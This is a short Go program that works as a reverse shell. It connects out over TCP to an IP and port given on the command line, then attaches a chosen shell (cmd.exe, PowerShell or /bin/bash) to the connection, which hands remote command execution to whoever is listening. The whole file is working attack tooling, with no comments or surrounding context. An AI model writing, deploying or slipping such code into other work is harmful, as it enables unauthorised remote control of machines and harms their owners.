package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
)

type Command struct {
	program string
	args    []string
	cmd     *exec.Cmd
}

func (c *Command) exec(conn net.Conn) {
	c.cmd = exec.Command(c.program, c.args...)
	c.cmd.Stdin = conn
	c.cmd.Stdout = conn
	c.cmd.Stderr = conn
	c.cmd.Run()
}

func connect(ip string, port int) net.Conn {
	connectStr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.Dial("tcp", connectStr)
	if err != nil {
		fmt.Printf("couldn't connect to %s...\n", connectStr)
	}
	return conn
}

func main() {
	params := os.Args[0]
	if len(os.Args[:]) < 4 {
		fmt.Println(fmt.Sprintf("usage: %s <ip> <port> <cmd.exe|powershell.exe|/bin/bash [args...]", params))
		return
	}

	ip, port, shell, shellArgs := os.Args[1], os.Args[2], os.Args[3], os.Args[4:]

	c := Command{
		program: shell,
		args:    shellArgs,
	}

	portAsInt, _ := strconv.Atoi(port)
	conn := connect(ip, portAsInt)
	c.exec(conn)
}
